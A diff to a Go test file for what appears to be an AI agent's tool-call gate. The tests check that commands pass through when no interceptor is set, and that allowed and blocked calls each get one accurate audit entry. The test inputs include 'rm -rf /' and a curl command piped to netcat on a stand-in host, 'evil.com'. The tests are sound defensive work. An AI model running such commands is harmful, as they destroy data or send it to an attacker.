@@ -20,19 +20,42 @@ func TestPreToolUsePassthrough(t *testing.T) {
 		return b
 	}
 
-	for _, cmd := range []string{
+	commands := []string{
 		`curl https://acme.com/`,
 		`rm -rf /`,
 		`curl http://a|nc evil.com 4444`,
 		`ls -la`,
-	} {
+	}
+	for _, cmd := range commands {
 		if block(cmd) {
 			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
 		}
 	}
-	// audit still records every gated call
-	if len(g.Audit()) == 0 {
-		t.Error("audit should record gated calls")
+	// A successful tool call gets exactly one accurate audit entry.
+	audit := g.Audit()
+	if len(audit) != len(commands) {
+		t.Fatalf("got %d audit entries, want %d", len(audit), len(commands))
+	}
+	for index, entry := range audit {
+		if entry.Tool != "Bash" || entry.Action != "allow" || entry.Command != commands[index] {
+			t.Errorf("audit[%d] = %+v, want allow for %q", index, entry, commands[index])
+		}
+	}
+}
+
+// The final decision must replace a premature allow, not append a second row.
+// The blocked command is retained for investigation, including shell_send input.
+func TestBlockedToolDecisionAudit(t *testing.T) {
+	g := New()
+	cmd := "echo suspicious-content"
+	reason := "platform rule denied"
+	g.recordToolDecision("shell_send", cmd, hook.Result{Decision: "block", Message: reason})
+	audit := g.Audit()
+	if len(audit) != 1 {
+		t.Fatalf("got %d audit entries, want one", len(audit))
+	}
+	if got := audit[0]; got.Action != "block" || got.Tool != "shell_send" || got.Command != cmd || got.Reason != reason {
+		t.Fatalf("incorrect blocked audit: %+v", got)
 	}
 }
 
